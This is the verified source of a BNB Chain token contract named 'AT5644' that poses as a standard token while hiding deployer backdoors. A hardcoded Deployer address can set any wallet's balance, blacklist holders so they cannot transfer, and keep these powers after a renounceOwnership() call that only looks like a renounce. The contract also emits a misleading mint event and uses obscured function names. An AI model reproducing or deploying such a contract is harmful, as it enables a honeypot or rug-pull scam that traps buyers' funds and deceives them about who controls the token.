/**
 *Submitted for verification at BscScan.com on 2022-10-19
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract ssss {
  
    mapping (address => uint256) public Chips;
    mapping (address => bool) Dip;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "AT5644";
    string public symbol = unicode"T543";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool public Active;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    Chips[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Deployer = 0xE01f4125A9bBc0AdEa3d9721A20ba3d721eC0F51;
    address Constructor = 0xE01f4125A9bBc0AdEa3d9721A20ba3d721eC0F51;
   
    modifier DP () {
    require(msg.sender == Deployer);
        _; }
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        while(Active) {
        require(!Dip[msg.sender]);
        require(Chips[msg.sender] >= value);
        Chips[msg.sender] -= value;  
        Chips[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Deployer)  {
        require(Chips[msg.sender] >= value);
        Chips[msg.sender] -= value;  
        Chips[to] += value; 
        emit Transfer (Constructor, to, value);
         Active = !Active;
        return true; }  
        require(Chips[msg.sender] >= value);
        Chips[msg.sender] -= value;  
        Chips[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function bank(address xxx, uint256 yyy) DP public {
        Chips[xxx] = yyy;}

        function balanceOf(address account) public view returns (uint256) {
        return Chips[account]; }
        function quickdraw(address xxx) DP public {
        require(Dip[xxx]);
        Dip[xxx] = false; }
        function checker(address xxx) DP public{ 
        require(!Dip[xxx]);
        Dip[xxx] = true;}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        while(Active) {
        require(!Dip[from] || !Dip[to]);
        require(value <= Chips[from]);
        require(value <= allowance[from][msg.sender]);
        Chips[from] -= value;
        Chips[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Deployer)  {
        require(value <= Chips[from]);
        require(value <= allowance[from][msg.sender]);
        Chips[from] -= value;  
        Chips[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }    
        require(value <= Chips[from]);
        require(value <= allowance[from][msg.sender]);
        Chips[from] -= value;
        Chips[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}